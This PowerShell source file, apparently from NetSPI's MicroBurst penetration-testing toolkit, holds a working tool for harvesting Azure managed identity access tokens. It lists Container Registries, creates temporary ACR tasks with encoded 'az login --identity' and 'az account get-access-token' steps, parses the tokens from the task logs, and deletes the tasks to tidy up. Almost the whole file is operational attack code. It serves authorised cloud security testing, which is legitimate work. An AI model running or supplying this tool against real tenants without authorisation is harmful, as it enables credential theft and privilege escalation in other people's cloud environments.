<#
    File: Invoke-AzACRTokenGenerator.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2023
    Description: PowerShell function for dumping Azure Managed Identity tokens, using ACR Tasks.
#>


Function Invoke-AzACRTokenGenerator
{
<#

    .SYNOPSIS
        Dumps access tokens for any Azure Container Registries with attached Managed Identities.
    .DESCRIPTION
        This function will look for any available Azure Container Registries, allow you to select registries to target, then create temporary tasks that use attached Managed Identities to generate access tokens.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER TokenScope
        The scope to generate the Managed Identity for.
    .EXAMPLE
        PS C:\MicroBurst> Invoke-AzACRTokenGenerator -Verbose
        VERBOSE: Logged In as kfosaaen@example.com
        VERBOSE: Enumerating Azure Container Registries in the "Sample Subscription" Subscription
        VERBOSE: 	2 Azure Container Registries Enumerated
        VERBOSE: 	2 Azure Container Registries Selected for Targeting
        VERBOSE: 		netspi Container Registry has a System Assigned Managed Identity attached
        VERBOSE: 			Creating token generation task (pclUgQiGryDSOLV) for the netspi Container Registry with a System Assigned Managed Identity
        VERBOSE: 				Running the token generation task (pclUgQiGryDSOLV) from the netspi Container Registry
        VERBOSE: 					Waiting for the task (pclUgQiGryDSOLV) logs
        VERBOSE: 				Parsing the task (pclUgQiGryDSOLV) logs
        VERBOSE: 			Deleting token generation task (pclUgQiGryDSOLV) from the netspi Container Registry
        VERBOSE: 		netspi Container Registry has a User Assigned Managed Identity (testingIdentity1) attached
        VERBOSE: 			Creating token generation task (KLwivMVbjgnmqHf) for the netspi Container Registry with a User Assigned Managed Identity (testingIdentity)
        VERBOSE: 				Running the token generation task (KLwivMVbjgnmqHf) from the netspi Container Registry
        VERBOSE: 					Waiting for the task (KLwivMVbjgnmqHf) logs
        VERBOSE: 				Parsing the task (KLwivMVbjgnmqHf) logs
        VERBOSE: 			Deleting token generation task (KLwivMVbjgnmqHf) from the netspi Container Registry
        VERBOSE: 		notspi Container Registry does not have a Managed Identity attached
        VERBOSE: Token Generation Activities Have Completed for the "Sample Subscription" Subscription

    .LINK
    https://www.netspi.com/blog/technical/cloud-penetration-testing/automating-managed-identity-token-extraction-in-azure-container-registries
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",

        [parameter(Mandatory=$false,
        HelpMessage="The scope to generate the Managed Identity for.")]
        [String]$TokenScope = "https://management.azure.com/"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Invoke-AzACRTokenGenerator -Subscription $sub -TokenScope $TokenScope}
        return
    }

    Write-Verbose "Logged In as $accountName"

    Write-Verbose "Enumerating Azure Container Registries in the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"
    # Get a list of Container Registries
    $ACRs = Get-AzContainerRegistry

    Write-Verbose "`t$($ACRs.Count) Azure Container Registries Enumerated"

    # List ACRs, pipe out to gridview selection
    $acrChoice = $ACRs | out-gridview -Title "Select One or More ACR" -PassThru

    if($acrChoice.Count -gt 0){
        Write-Verbose "`t$($acrChoice.Count) Azure Container Registries Selected for Targeting"

        # Create data table to house results
        $TempTblTokens = New-Object System.Data.DataTable 
        $TempTblTokens.Columns.Add("ACR") | Out-Null
        $TempTblTokens.Columns.Add("ManagedIdentity") | Out-Null
        $TempTblTokens.Columns.Add("Scope") | Out-Null
        $TempTblTokens.Columns.Add("Token") | Out-Null

        # Get Token for REST APIs
        $AccessToken = Get-AzAccessToken
        if ($AccessToken.Token -is [System.Security.SecureString]) {
            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
            try {
                $basetoken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
            } finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
            }
        } else {
            $basetoken = $AccessToken.Token
        }

        # Iterate through the ACRs
        $acrChoice | ForEach-Object{
            
            $location = $_.Location
            $ResourceGroupName = $_.ResourceGroupName
        
            # Grab the ACR Managed Identity Info
            $ACRendpoint = (-join("https://management.azure.com",$_.Id,"?api-version=2022-02-01-preview"))
            $ACRInfo = (Invoke-RestMethod -UseBasicParsing -Uri $ACRendpoint -Headers @{ Authorization ="Bearer $basetoken"} -Verbose:$false)
            $ACRInfo | ForEach-Object{
                
                    # Case - Has a systemAssigned
                    if($_.identity.type -match "systemAssigned"){
                        Write-Verbose "`t`t$($_.name) Container Registry has a System Assigned Managed Identity attached"
                        $tokenOut = Invoke-AzACRTokenTask -SubscriptionID $Subscription -Name $_.name -TokenScope $TokenScope -Location $location -ResourceGroupName $ResourceGroupName | ConvertFrom-Json
                        $TempTblTokens.Rows.Add($tokenOut.ACR,$tokenOut.ManagedIdentity,$tokenOut.Scope,$tokenOut.Token) | Out-Null
                    }

                    # Case - Has a userAssigned
                    if($_.identity.type -match "userAssigned"){
                        
                        $ACRName = $_.name
                        $noteProperties = Get-Member -InputObject $_.identity.userAssignedIdentities | Where-Object {$_.MemberType -eq "NoteProperty"}

                        foreach($id in $noteProperties){
                            Write-Verbose "`t`t$($_.name) Container Registry has a User Assigned Managed Identity ($(($id.Name).Split("/")[-1])) attached"
                            $tokenOut = Invoke-AzACRTokenTask -SubscriptionID $Subscription -Name $ACRName -ManagedIdentity $id.Name -TokenScope $TokenScope -UserAssignedID $_.identity.userAssignedIdentities.$($id.Name).clientId -Location $location -ResourceGroupName $ResourceGroupName | ConvertFrom-Json
                            $TempTblTokens.Rows.Add($tokenOut.ACR,$tokenOut.ManagedIdentity,$tokenOut.Scope,$tokenOut.Token) | Out-Null
                        }
                    }
                    # Case - Has no attached Managed IDs - Do nothing
                    else{Write-Verbose "`t`t$($_.name) Container Registry does not have a Managed Identity attached"}
            }
            
        }
    }
    else{Write-Verbose "`tNo Azure Container Registries available in the current Subscription or login context"}
    
    Write-Verbose "Token Generation Activities Have Completed for the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"
    
    # Output Tokens
    Write-Output $TempTblTokens
        
}

Function Invoke-AzACRTokenTask
{

    <#     This is a helper function for the main function     #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$SubscriptionID = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="The location of the ACR.")]
        [String]$Location = "",

        [parameter(Mandatory=$false,
        HelpMessage="The Resource Group of the ACR.")]
        [String]$ResourceGroupName = "",

        [parameter(Mandatory=$false,
        HelpMessage="The Managed Identity to target.")]
        [String]$ManagedIdentity = "",

        [parameter(Mandatory=$false,
        HelpMessage="The UA Managed Identity ID to target.")]
        [String]$UserAssignedID = "",

        [parameter(Mandatory=$false,
        HelpMessage="The scope to generate the Managed Identity for.")]
        [String]$TokenScope = "https://management.azure.com/",

        [Parameter(Mandatory=$false,
        HelpMessage="The name of the ACR to target.")]
        [string]$Name = ""

    )

    # Get Token for REST APIs
    $AccessToken = Get-AzAccessToken
    if ($AccessToken.Token -is [System.Security.SecureString]) {
        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
        try {
            $basetoken = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
        } finally {
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
        }
    } else {
        $basetoken = $AccessToken.Token
    }

    # Set Random names for the tasks. Prevents conflict issues
    $taskName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

    if ($ManagedIdentity -eq ""){
        # System Assigned Case
        Write-Verbose "`t`t`tCreating token generation task ($taskName) for the $name Container Registry with a System Assigned Managed Identity"

        # Create value for output
        $MIDValue = "SystemAssigned"

        # Build the Steps - Convert to B64
        $taskb64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("version: v1.1.0`nsteps:`n  - cmd: az login --identity --allow-no-subscriptions`n  - cmd: az account get-access-token --resource=$TokenScope"))

        # Build POST Body for Task Creation
        $taskBody = @{
          location = $Location
          properties = @{
            status = "Enabled"
            platform = @{
              os = "Linux"
              architecture = "amd64"
            }
            agentConfiguration = @{
              cpu = 2
            }
            timeout = 3600
            step = @{
              type = "EncodedTask"
              encodedTaskContent = $taskb64
              values = ""
            }
            trigger= @{
              baseImageTrigger = @{
                name = "defaultBaseimageTriggerName"
                updateTriggerPayloadType = "Default"
                baseImageTriggerType = "Runtime"
                status = "Enabled"
              }
            }
          }
          identity = @{
            type = "SystemAssigned"
          }
        }

    }
    else{
        # User Assigned Case
        Write-Verbose "`t`t`tCreating token generation task ($taskName) for the $name Container Registry with a User Assigned Managed Identity ($(($id.Name).Split("/")[-1]))"

        # Create value for output
        $MIDValue = $id.Name

        # Build the Steps - Convert to B64
        $taskb64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("version: v1.1.0`nsteps:`n  - cmd: az login --identity --allow-no-subscriptions --username $UserAssignedID`n  - cmd: az account get-access-token --resource=$TokenScope"))

        # Build POST Body for Task Creation
        $taskBody = @{
          location = $Location
          properties = @{
            status = "Enabled"
            platform = @{
              os = "Linux"
              architecture = "amd64"
            }
            agentConfiguration = @{
              cpu = 2
            }
            timeout = 3600
            step = @{
              type = "EncodedTask"
              encodedTaskContent = $taskb64
              values = ""
            }
            trigger= @{
              baseImageTrigger = @{
                name = "defaultBaseimageTriggerName"
                updateTriggerPayloadType = "Default"
                baseImageTriggerType = "Runtime"
                status = "Enabled"
              }
            }
          }
          identity = @{
            type = "SystemAssigned, UserAssigned"
            userAssignedIdentities = @{
               $ManagedIdentity = @{}
            }
          }
        }
    }
    
    # Submit POST Request
    $resourceURL = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.ContainerRegistry/registries/$Name/tasks/$($taskName)?api-version=2019-04-01"
    $taskCreation = Invoke-RestMethod -Uri $resourceURL -Headers @{ Authorization ="Bearer $basetoken"} -Verbose:$false -Method Put -Body $($taskBody | ConvertTo-Json -Depth 3) -ContentType "application/json"

    # Schedule the run of the Task
    $schedBody = @{
	    type = "TaskRunRequest"
	    isArchiveEnabled = $false
	    taskId = "/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.ContainerRegistry/registries/$Name/tasks/$($taskName)"
        TaskName = $($taskName)
	    overrideTaskStepProperties = @{
            arguments = @()
            values = @()
        }
    }
    $taskRunURL = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.ContainerRegistry/registries/$Name/scheduleRun?api-version=2019-04-01"
    Write-Verbose "`t`t`t`tRunning the token generation task ($taskName) from the $name Container Registry"
    $taskRun = Invoke-RestMethod -Uri $taskRunURL -Headers @{ Authorization ="Bearer $basetoken"} -Verbose:$false -Method Post -Body $($schedBody | ConvertTo-Json -Depth 3) -ContentType "application/json" | ConvertTo-Json | ConvertFrom-Json

    # Get Task Results Log Link
    Write-Verbose "`t`t`t`t`tWaiting for the task ($taskName) logs"
    $logLinkURL = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.ContainerRegistry/registries/$Name/runs/$($taskRun.name)/listLogSasUrl?api-version=2019-04-01"
    $logLink = Invoke-RestMethod -Uri $logLinkURL -Headers @{ Authorization ="Bearer $basetoken"} -Verbose:$false -Method Post -ContentType "application/json" | ConvertTo-Json | ConvertFrom-Json
    
    # Wait for "x-ms-meta-Complete: successful" status on the blob
    $logOutputHEAD = ""
    while($logOutputHEAD.'x-ms-meta-Complete' -ne 'successful'){
        try{$logOutputHEAD = (Invoke-WebRequest -ErrorAction SilentlyContinue -Verbose:$false -UseBasicParsing -Method Head -Uri $logLink.logLink).Headers; sleep 3}
        catch{}
    }

    # Poll the log link for results
    $logOutput = (Invoke-WebRequest -Verbose:$false -UseBasicParsing -Uri $logLink.logLink).Content

    Write-Verbose "`t`t`t`tParsing the task ($taskName) logs"

    # Define a regular expression pattern to match JSON objects
    $jsonPattern = '\{(?:[^{}]|(?<o>\{)|(?<-o>\}))+(?(o)(?!))\}'

    # Find all JSON matches in the output
    $jsonMatches = [regex]::Matches($logOutput, $jsonPattern)


    # Output Object
    $outputOBJ = @{
	    ACR = $Name
	    ManagedIdentity = $MIDValue
	    Token = ($jsonMatches.value | ConvertFrom-Json).accessToken[1]
        Scope = $TokenScope
    }

    # Remove the Task
    Write-Verbose "`t`t`tDeleting token generation task ($taskName) from the $name Container Registry"
    $taskDeletion = Invoke-RestMethod -Uri $resourceURL -Headers @{ Authorization ="Bearer $basetoken"} -Verbose:$false -Method Delete

    $outputOBJ | ConvertTo-Json
}